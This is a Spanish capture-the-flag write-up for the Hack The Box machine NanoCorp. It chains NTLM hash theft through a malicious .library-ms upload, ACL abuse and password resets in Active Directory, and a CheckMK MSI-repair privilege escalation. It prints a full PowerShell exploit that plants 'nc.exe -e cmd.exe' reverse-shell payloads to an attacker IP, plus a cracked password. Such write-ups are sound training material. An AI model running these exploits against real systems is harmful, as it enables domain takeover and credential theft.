# Writeup de NanoCorp

---

### Writeup: NanoCorp (Hack The Box — Retirada)

  

NanoCorp es una máquina **Hard** que simula el entorno de una pequeña corporación con múltiples cuentas de servicio, permisos mal configurados y una herramienta de monitorización empresarial explotable. El objetivo es pasar de un punto de entrada inicial (obteniendo un hash NTLMv2) hasta el compromiso total del dominio y la obtención de la flag de SYSTEM.

  

---

  

### Fase 1: Reconocimiento (Escaneo de puertos)

  

Lanzamos un escaneo completo de puertos con Nmap para descubrir todos los servicios expuestos:

sudo nmap -sS --min-rate 500 -p- -n -Pn 10.129.243.199 -oG allPorts

**Explicación de parámetros:**

- `**-sS**`: Escaneo SYN (sigiloso), rápido y sin completar la conexión TCP.
- `**--min-rate 500**`: Fuerza a Nmap a enviar al menos 500 paquetes por segundo, acelerando el escaneo.
- `**-p-**`: Escanea todos los 65535 puertos.
- `**-n**`: Omite la resolución DNS para evitar demoras.
- `**-Pn**`: Salta el descubrimiento de hosts (asume que la máquina está activa).
- `**-oG allPorts**`: Guarda la salida en formato "grepable" para procesarla fácilmente.

**Resultado del escaneo:**

Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-27 07:30 -0400  
Nmap scan report for 10.129.243.199  
Host is up (0.11s latency).  
Not shown: 65516 filtered tcp ports (no-response)  
PORT      STATE SERVICE  
53/tcp    open  domain  
80/tcp    open  http  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5986/tcp  open  wsmans  
9389/tcp  open  adws  
49624/tcp open  unknown  
49629/tcp open  unknown  
49651/tcp open  unknown  
49664/tcp open  unknown  
49669/tcp open  unknown  
  
Nmap done: 1 IP address (1 host up) scanned in 327.14 seconds

Tras el escaneo, utilizo mi función `**extractPorts**` (definida en `**~/.zshrc**`) para extraer la IP y los puertos abiertos, y copiarlos automáticamente al portapapeles:

┌──(kali㉿kali)-[~/Projects/NanoCorp/nmap]  
└─$ extractPorts allPorts  
  
[*] Extrayendo información...  
  
        [*] Dirección IP: 10.129.243.199  
        [*] Puertos abiertos: 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49624,49629,49651,49664,49669  
  
[*] Puertos copiados al portapapeles

#### Enumeración de servicios

Con los puertos identificados, realizamos un escaneo más exhaustivo para determinar qué servicios y versiones están corriendo en cada uno, incluyendo scripts de enumeración básicos:

nmap -sVC -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49624,49629,49651,49664,49669 10.129.243.199 -oN targeted

Resultado:

PORT      STATE SERVICE           VERSION  
53/tcp    open  domain            Simple DNS Plus  
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)  
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12  
|_http-title: Nanocorp | Career Opportunities  
| http-methods:   
|_  Potentially risky methods: TRACE  
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-27 07:42:15Z)  
135/tcp   open  msrpc             Microsoft Windows RPC  
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn  
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ldapssl?  
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)  
3269/tcp  open  globalcatLDAPssl?  
5986/tcp  open  ssl/wsmans?  
| tls-alpn:   
|   h2  
|_  http/1.1  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc01.nanocorp.htb  
| Subject Alternative Name: DNS:dc01.nanocorp.htb  
| Not valid before: 2025-04-06T22:58:43  
|_Not valid after:  2026-04-06T23:18:43  
9389/tcp  open  mc-nmf            .NET Message Framing  
49624/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0  
49629/tcp open  msrpc             Microsoft Windows RPC  
49651/tcp open  msrpc             Microsoft Windows RPC  
49664/tcp open  msrpc             Microsoft Windows RPC  
49669/tcp open  msrpc             Microsoft Windows RPC  
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:   
|   3.1.1:   
|_    Message signing enabled and required  
| smb2-time:   
|   date: 2026-06-27T07:43:44  
|_  start_date: N/A  
|_clock-skew: 7h00m12s

**Observaciones clave del escaneo:**

- **Puertos AD típicos**: 53 (DNS), 88 (Kerberos), 135, 389 (LDAP), 445 (SMB), 464 (kpasswd5), 636 (LDAPS), 3268/3269 (catálogo global), 5986 (WinRM sobre HTTPS), 9389 (ADWS).
- **Dominio**: `nanocorp.htb` y el host `dc01.nanocorp.htb`.
- **Puerto 80**: Servidor web Apache con PHP, aparentemente un portal de empleo (“Nanocorp | Career Opportunities”).
- **Firma SMB**: El mensaje está habilitado y es requerido (lo que dificulta ataques de relé).

Configuramos la resolución DNS del dominio en nuestro archivo `**/etc/hosts**` para poder resolver correctamente los nombres del dominio Active Directory:

echo "10.129.243.199 nanocorp.htb dc01.nanocorp.htb" >> /etc/hosts

  

### Fase 3: Enumeración Web

El puerto 80 nos presenta un sitio web de empleo de NanoCorp. Al inspeccionar la página, encontramos un subdominio dedicada a la contratación: `**hire.nanocorp.htb**`. Este portal permite a los candidatos subir sus currículums en formato `.zip` o `.rar`, y el servidor los extrae automáticamente. Este comportamiento, en un entorno Windows, es una señal de alarma clásica: la extracción automática de archivos puede desencadenar conexiones SMB que filtran hashes NTLM.

![](https://cdn-images-1.medium.com/max/960/1*hvZJi7tEXlk1DR0pF8jfiw.png)

Antes de profundizar, realicé algunas comprobaciones rápidas para confirmar la naturaleza del objetivo. El escaneo de Nmap ya mostraba puertos típicos de AD. Para obtener más pistas, probé autenticación nula con `nxc`:

nxc ldap 10.129.243.199 -u 'guest' -p ''  
LDAP        10.129.243.199  389    DC01             [-] nanocorp.htb\guest: STATUS_ACCOUNT_DISABLED

nxc smb 10.129.243.199 -u 'guest' -p ''  
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\guest: STATUS_ACCOUNT_DISABLED

Aunque el usuario invitado está deshabilitado, el resultado de `nxc ldap` reveló dos características críticas:

- `**signing:None**`: El controlador de dominio no exige la firma LDAP, lo que permite que se acepten enlaces LDAP sin firmar.
- `**channel binding:No TLS cert**`: Tampoco se aplica la vinculación de canales (EPA) a través de TLS.

En conjunto, estas configuraciones hacen que el DC sea vulnerable a **NTLM relay hacia LDAP**. Un atacante que pueda capturar una autenticación NTLM (por ejemplo, mediante una conexión SMB o un archivo malicioso) podría retransmitirla a LDAP y que sea aceptada sin necesidad de firmas ni certificados. Esto, sumado a la funcionalidad de subida de archivos, me hizo sospechar que el vector de ataque más probable era una vulnerabilidad conocida de robo de NTLM.

#### Identificación de la vulnerabilidad

  

El proceso de descubrimiento fue el siguiente:

1. **Observación del ataque:** El portal `hire.nanocorp.htb` permite subir un ZIP que el servidor extrae automáticamente. En Windows, ciertos tipos de archivos, al ser procesados, intentan conectarse a rutas UNC, enviando el hash NTLM del usuario.
2. **Pregunta clave:** _“¿Qué tipos de archivos de Windows, al ser extraídos o abiertos, desencadenan una conexión SMB?”_
3. **Conocimiento previo:** Archivos como `.scf`, `.lnk`, `.url` y `desktop.ini` han sido históricamente utilizados para robar hashes NTLM. En 2025, se documentó un nuevo vector: los archivos `.library-ms`.
4. **Búsqueda en Google y GitHub:** Usé términos como `"library-ms NTLM leak CVE 2025"` y `"ZIP upload Windows NTLM hash steal"`, lo que me llevó al **CVE-2025-24071** (aunque Microsoft lo renombró posteriormente). Encontré un PoC funcional en GitHub: [CVE-2025-24054](https://github.com/reloc2/CVE-2025-24054) (el autor indica que Microsoft cambió la numeración, pero el exploit es el mismo).

### ¿Cómo funciona el CVE-2025–24071?

La vulnerabilidad reside en cómo Windows maneja los archivos `**.library-ms**` (archivos XML que definen bibliotecas de carpetas). El ataque se desarrolla así:

1. El atacante crea un archivo `.library-ms` malicioso que contiene una **ruta UNC** (por ejemplo, `\\atacante\share`) que apunta a su propio servidor.
2. Cuando Windows procesa este archivo (al extraerlo de un ZIP, al abrirlo, o incluso al **navegar a la carpeta donde se encuentra**), el sistema intenta conectarse automáticamente a esa ruta remota.
3. En ese intento de conexión, Windows inicia una **autenticación NTLM automática** y envía el **hash NetNTLMv2** del usuario al servidor del atacante.

#### Explotación

python poc.py  
Enter your file name: payload  
Enter IP (EX: 192.168.1.162): 10.10.17.44  
completed

unzip -l exploit.zip  
Archive:  exploit.zip  
  Length      Date    Time    Name  
---------  ---------- -----   ----  
      365  2026-06-26 20:48   payload.library-ms  
---------                     -------  
      365                     1 file

Mientras tanto, en otra terminal, inicié `responder` en modo escucha para capturar las peticiones NTLM:

sudo responder -I tun0 -v

Subí el archivo `exploit.zip` a través del portal `hire.nanocorp.htb`. Al procesarlo, el servidor intentó acceder a la ruta UNC y `responder` capturó el hash del usuario `**web_svc**`:

[SMB] NTLMv2-SSP Client   : 10.129.243.199  
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc  
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:... (hash completo)

#### Crackeo del hash y obtención de credenciales

Guardé el hash en un archivo y lo crackeé con `hashcat` (modo 5600) usando el diccionario `rockyou.txt`:

El crackeo reveló funcionó. Verifiqué las credenciales con `nxc`:

nxc smb 10.129.243.199 -u 'web_svc' -p '****'  
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:****

  

### Fase 4: Enumeración de Active Directory con BloodHound

Con las credenciales de `web_svc`, el siguiente paso es mapear el dominio para identificar rutas de escalada. Usé `nxc` con el módulo de BloodHound para recolectar datos de forma automatizada:

LDAP        10.129.243.199  389    DC01             Done in 1M 13S  
LDAP        10.129.243.199  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.243.199_2026-06-26_211604_bloodhound.zip

![697](https://cdn-images-1.medium.com/max/960/1*xrGKYxVvatF8PBUNGdJQmg.png)

![](https://cdn-images-1.medium.com/max/960/1*yT0_7l4RLOJ9SwOZmoDsxQ.png)

![](https://cdn-images-1.medium.com/max/960/1*DML76Fa9oCfOBE7CtGddbg.png)

 Tras analizar el grafo, encontraremos una ruta de escalada crítica:

- El usuario `**web_svc**` tiene el permiso `**AddSelf**` sobre el grupo `**IT_SUPPORT**`. Esto significa que `web_svc` puede añadirse a sí mismo como miembro de ese grupo. Al hacerlo, adquiere todos los privilegios del grupo.
- El grupo `**IT_SUPPORT**` tiene el permiso `**ForceChangePassword**` sobre la cuenta `**monitoring_svc**`. Es decir, cualquier miembro de `IT_SUPPORT` puede restablecer la contraseña de `monitoring_svc`.
- La cuenta `**monitoring_svc**` tiene acceso `**WinRM**` sobre el controlador de dominio, lo que permite una shell remota.

Esta cadena de permisos nos permite escalar de `web_svc` a `monitoring_svc` y, desde ahí, obtener acceso al sistema.

### La cuenta `monitoring_svc`: contexto y limitaciones

Antes de continuar, es importante entender el contexto de la cuenta que acabamos de comprometer. `monitoring_svc` pertenece a varios grupos que definen sus capacidades y, también, sus limitaciones:

- `**Domain Users**`: Es el grupo predeterminado al que pertenecen todos los usuarios del dominio .De por sí, no otorga permisos administrativos; es simplemente el grupo base que indica que la cuenta es un usuario del dominio. Es el punto de partida de cualquier cuenta.
- `**Remote Management Users**`: Este grupo permite a sus miembros conectarse al sistema mediante **WinRM** (Windows Remote Management). Es el permiso que nos permite obtener una shell a través de herramientas como `winrmexec.py` o `evil-winrm`. Sin esta membresía, no podríamos conectarnos aunque tuviéramos las credenciales.
- `**Protected Users**`: Este es el grupo más restrictivo y con mayor impacto en la escalada

Está diseñado para proteger cuentas de alto valor contra el robo de credenciales y aplica **protecciones no configurables**. Las limitaciones para los miembros de este grupo son significativas:

- **No pueden autenticarse con NTLM**. Esto significa que cualquier ataque que dependa de NTLM (como Pass-the-Hash o relays) fallará.
- **No pueden usar cifrados Kerberos DES o RC4** en la preautenticación. Solo se permite **AES.**
- **No pueden usar delegación restringida ni no restringida.**
- **El TGT (Ticket Granting Ticket) tiene una vida útil máxima de 4 horas (240 minutos)**, en lugar de la duración estándar del dominio.
- **No se almacenan credenciales en caché** en los dispositivos, lo que impide el inicio de sesión sin conexión.

Estas restricciones convierten a `Protected Users` en un arma de doble filo. Por un lado, protege la cuenta; por otro, **puede romper funcionalidades legítimas** si no se configura correctamente. Por ejemplo, conectarse por RDP usando la **IP** en lugar del **FQDN** fallará porque Kerberos no puede resolver el SPN y el sistema intentará usar NTLM, que está bloqueado. En nuestro caso, para conectarnos por WinRM, debemos asegurarnos de usar el **FQDN** (`dc01.nanocorp.htb`) y no la IP directamente, para que la autenticación Kerberos funcione.

  

### Fase 5: Abuso de permisos ACL y escalada

Antes de proceder, es fundamental sincronizar la hora con el dominio. En entornos AD, los tickets de Kerberos tienen validez temporal y una diferencia horaria superior a 5 minutos los invalida.

sudo ntpdate dc01.nanocorp.htb

**Nota:** Esta máquina tiene un script de limpieza que puede resetear el entorno periódicamente. Si los tickets dejan de funcionar, repite la sincronización y vuelve a obtener el TGT.

#### Obtener un TGT para `web_svc`

Con la hora sincronizada, obtenemos un Ticket Granting Ticket (TGT) usando `getTGT.py` de Impacket:

impacket-getTGT nanocorp.htb/web_svc:'****' -dc-ip dc01.nanocorp.htb

Esto genera el archivo `web_svc.ccache`.

#### Configurar Kerberos

Para que las herramientas utilicen autenticación Kerberos, generamos un archivo de configuración `krb5.conf`:

nxc smb dc01.nanocorp.htb --generate-krb5-file nanocorp.krb5  
export KRB5_CONFIG=nanocorp.krb5

#### Añadir `web_svc` al grupo `IT_SUPPORT`

Usamos `bloodyAD` con autenticación Kerberos para abusar del permiso `AddSelf` y añadir el usuario al grupo:

KRB5CCNAME=web_svc.ccache bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -k add groupMember IT_SUPPORT web_svc

La salida confirma que `web_svc` ha sido añadido correctamente al grupo.

#### Cambiar la contraseña de `monitoring_svc`

Ahora que `web_svc` es miembro de `IT_SUPPORT`, podemos forzar el cambio de contraseña de `monitoring_svc`:

KRB5CCNAME=web_svc.ccache bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -k set password monitoring_svc 'P@ssw0rd123!'

#### Obtener TGT para `monitoring_svc`

Con la nueva contraseña, obtenemos un TGT para `monitoring_svc`:

impacket-getTGT nanocorp.htb/monitoring_svc:'P@ssw0rd123!' -dc-ip dc01.nanocorp.htb

#### Conexión por WinRM

Usando el TGT de `monitoring_svc`, nos conectamos por WinRM usando winrmexec.py. Es crucial usar el **FQDN** (`dc01.nanocorp.htb`). :

wget https://raw.githubusercontent.com/ozelis/winrmexec/main/winrmexec.py                                                     

KRB5CCNAME=monitoring_svc.ccache python3 winrmexec.py -k 'nanocorp/monitoring_svc@dc01.nanocorp.htb' -no-pass -port 5986 -ssl

Al usar el FQDN, la autenticación Kerberos funciona correctamente y la shell se establece:

PS C:\Users\monitoring_svc> whoami  
nanocorp\monitoring_svc  
  
PS C:\Users\monitoring_svc> tree /f  
...  
+---Desktop  
¦       user.txt

En el escritorio, encontramos la **flag de usuario (**`**user.txt**`**)**.

  

### Fase 6: Enumeración local y escalada a SYSTEM

  

Tras obtener una shell como `monitoring_svc`, el siguiente paso era enumerar el sistema en busca de vectores de escalada de privilegios. Revisé los directorios principales y encontré algunos puntos de interés:

PS C:\> ls  
  
    Directory: C:\  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----         11/3/2025   4:13 PM                inetpub  
d-----          5/8/2021   1:20 AM                PerfLogs  
d-r---          4/2/2025   6:35 PM                Program Files  
d-----          4/5/2025   4:17 PM                Program Files (x86)  
d-r---          4/9/2025   6:19 PM                Users  
d-----         11/3/2025   4:18 PM                Windows  
d-----          4/5/2025  10:59 AM                xampp

PS C:\> ls xampp\htdocs\nanocorp  
  
  
    Directory: C:\xampp\htdocs\nanocorp  
  
  
Mode                 LastWriteTime         Length Name                                                                    
----                 -------------         ------ ----                                                                    
d-----          4/5/2025  10:58 AM                css                                                                     
d-----          4/5/2025  10:58 AM                fontawesome                                                             
d-----          4/9/2025  11:24 PM                img                                                                     
d-----          4/5/2025  10:58 AM                js                                                                      
d-----          4/5/2025  10:58 AM                slick                                                                   
-a----          4/9/2025  11:27 PM          16212 index.html 

PS C:\> ls 'Program Files'  
  
  
    Directory: C:\Program Files  
  
  
Mode                 LastWriteTime         Length Name                                                                    
----                 -------------         ------ ----                                                                    
d-----          4/2/2025   6:24 PM                Common Files                                                            
d-----         11/3/2025   4:13 PM                Internet Explorer                                                       
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps                                                   
d-----          4/2/2025   6:25 PM                VMware                                                                  
d-----          5/8/2021   2:35 AM                Windows Defender                                                        
d-----         11/3/2025   4:13 PM                Windows Defender Advanced Threat Protection                             
d-----         11/3/2025   4:13 PM                Windows Mail                                                            
d-----         11/3/2025   4:13 PM                Windows Media Player                                                    
d-----          5/8/2021   2:35 AM                Windows NT                                                              
d-----         11/3/2025   4:13 PM                Windows Photo Viewer                                                    
d-----          5/8/2021   1:34 AM                WindowsPowerShell                                                       
d-----          4/2/2025   6:36 PM                WinRAR  

PS C:\> ls 'Program Files (x86)'  
  
  
    Directory: C:\Program Files (x86)  
  
  
Mode                 LastWriteTime         Length Name                                                                    
----                 -------------         ------ ----                                                                    
d-----          4/5/2025   4:17 PM                checkmk                                                                 
d-----          5/8/2021   1:34 AM                Common Files                                                            
d-----         11/3/2025   4:13 PM                Internet Explorer                                                       
d-----          5/8/2021   2:40 AM                Microsoft                                                               
d-----          5/8/2021   1:34 AM                Microsoft.NET                                                           
d-----          5/8/2021   2:35 AM                Windows Defender                                                        
d-----         11/3/2025   4:13 PM                Windows Mail                                                            
d-----         11/3/2025   4:13 PM                Windows Media Player                                                    
d-----          5/8/2021   2:35 AM                Windows NT                                                              
d-----         11/3/2025   4:13 PM                Windows Photo Viewer                                                    
d-----          5/8/2021   1:34 AM                WindowsPowerShell  

El directorio `xampp\htdocs\hire` contenía el código fuente del portal de subida de archivos, mientras que `Program Files (x86)` albergaba una carpeta llamada `**checkmk**`:

PS C:\> ls 'Program Files (x86)'  
  
    Directory: C:\Program Files (x86)  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----          4/5/2025   4:17 PM                checkmk

Investigué qué era CheckMK. Se trata de una plataforma de monitorización de infraestructuras TI que permite supervisar servidores, redes y aplicaciones en tiempo real. Para confirmar que el servicio estaba en ejecución, revisé los puertos en escucha y encontré el puerto **6556** asociado al proceso `cmk-agent-ctl`:

PS C:\> netstat -ano | findstr LISTENING | findstr :6556  
  TCP    0.0.0.0:6556           0.0.0.0:0              LISTENING       3804  
  TCP    [::]:6556              [::]:0                 LISTENING       3804

PS C:\> get-process | findstr 3804  
    103      11     1456       7416              3804   0 cmk-agent-ctl

Con el PID confirmado, busqué la versión del agente en el registro de Windows:

PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion | Sort DisplayName  
  
DisplayName                                                        DisplayVersion  
-----------                                                        --------------  
Check MK Agent 2.1                                                 2.1.0.50010

La versión **2.1.0.50010** me llevó a investigar vulnerabilidades conocidas para CheckMK Agent. Encontré el **CVE-2024–0670**, una vulnerabilidad de escalada de privilegios local que afecta a Checkmk Agent 2.1.0p10 y versiones anteriores. La vulnerabilidad reside en el mecanismo de reparación del MSI: cuando se repara el paquete, `msiexec.exe` se ejecuta como **SYSTEM** y procesa archivos `.cmd` desde rutas predecibles en `C:\Windows\Temp\`. Estos archivos siguen el patrón de nombres `cmk_all_<PID>_<CTR>.cmd`. Al sembrar miles de archivos maliciosos en ese directorio, podemos forzar que uno de ellos sea ejecutado con privilegios de SYSTEM durante la reparación.

#### Preparación de la explotación

Desde mi máquina Kali, preparé las herramientas necesarias:

# Copiar netcat  
cp /usr/share/windows-resources/binaries/nc.exe .  
  
# Descargar RunasCs   
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip  
unzip RunasCs.zip

Monté un servidor HTTP para transferir los binarios a la máquina víctima:

python3 -m http.server 8000

Desde la shell de `monitoring_svc`, descargué `nc.exe` y `RunasCs.exe` a `C:\Windows\Temp\`:

PS C:\Windows\Temp> wget "http://10.10.17.44:8000/nc.exe" -UseBasicParsing -OutFile "nc.exe"  
PS C:\Windows\Temp> wget "http://10.10.17.44:8000/RunasCs.exe" -UseBasicParsing -OutFile "RunasCs.exe"

También preparé un script PowerShell (`pwn.ps1`) que realiza el seeding de los archivos maliciosos y fuerza la reparación del MSI. El script localiza la ruta del MSI en el registro, escribe miles de archivos `.cmd` con el payload `nc.exe -e cmd.exe <IP> <PORT>` y luego ejecuta `msiexec /fa` para desencadenar la reparación.

param(  
    [int]$MinPID = 1000,  
    [int]$MaxPID = 15000,  
    [string]$LHOST = "10.10.17.44",  
    [string]$LPORT = "4444"  
)  
  
$NcPath = "C:\Windows\Temp\nc.exe"  
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"  
  
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |  
        Where-Object { $_.DisplayName -like '*mk*' } |  
        Select-Object -First 1).LocalPackage  
  
if (!$msi) {  
    Write-Error "Could not find Checkmk MSI"  
    return  
}  
  
Write-Host "[*] Found MSI at $msi"  
Write-Host "[*] Seeding files..."  
  
foreach ($ctr in 0..1) {  
    for ($num = $MinPID; $num -le $MaxPID; $num++) {  
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"  
        try {  
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)  
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue  
        } catch {}  
    }  
}  
  
Write-Host "[*] Seeding complete. Triggering MSI repair..."  
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait  
Write-Host "[*] Done! Check listener."

#### ¿Por qué ejecutar como `web_svc`?

Un detalle importante en tener encuenta es que el MSI de CheckMK fue instalado por el usuario `web_svc`. Durante la reparación, el MSI se ejecuta en el contexto de instalación de ese usuario. Si ejecutamos el script desde `monitoring_svc`, la reparación podría fallar . Por tanto, debemos usar `RunasCs.exe` para ejecutar el script PowerShell **como el usuario** `**web_svc**`.

Primero, confirmé que `web_svc` tenía una sesión activa en el sistema:

PS C:\Windows\Temp> .\RunasCs.exe whatever whatever qwinsta -l 9  
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE  
>services                                    0  Disc  
 console                                     1  Conn  
                   web_svc                   2  Disc  
 rdp-tcp                                 65536  Listen

Luego, ejecuté el script `pwn.ps1` en el contexto de `web_svc`:

PS C:\Windows\Temp> .\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\pwn.ps1"

El script se ejecutó correctamente, sembró los archivos maliciosos y forzó la reparación del MSI:

[*] Found MSI at C:\Windows\Installer\1e6f2.msi  
[*] Seeding files...  
[*] Seeding complete. Triggering MSI repair...  
[*] Done! Check listener.

Mientras tanto, en mi Kali tenía un listener en el puerto 4444:

nc -nlvp 4444

Unos segundos después, recibí la conexión:

connect to [10.10.17.44] from (UNKNOWN) [10.129.40.142] 51513  
Microsoft Windows [Version 10.0.20348.3207]  
(c) Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>whoami  
nt authority\system  
  
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt  
[REDACTED]

  

---

  

### Conclusión 

NanoCorp es una máquina **Hard** que combina múltiples técnicas de ataque en un entorno Active Directory:

1. **Robo de NTLM mediante CVE-2025–24071** (archivos `.library-ms` en subida de ZIP).
2. **Crackeo del hash** de `web_svc` y obtención de credenciales.
3. **BloodHound** para identificar una ruta de escalada vía ACLs: `web_svc` → `AddSelf` a `IT_SUPPORT` → `ForceChangePassword` sobre `monitoring_svc`.
4. **Abuso de Kerberos** (TGT y autenticación basada en tickets) para ejecutar cambios en el AD.
5. **WinRM con Kerberos** para obtener una shell como `monitoring_svc` y la flag de usuario.
6. **Escalada a SYSTEM** mediante CVE-2024–0670 en el MSI de CheckMK Agent, ejecutando el payload en el contexto de `web_svc` para desencadenar la reparación.
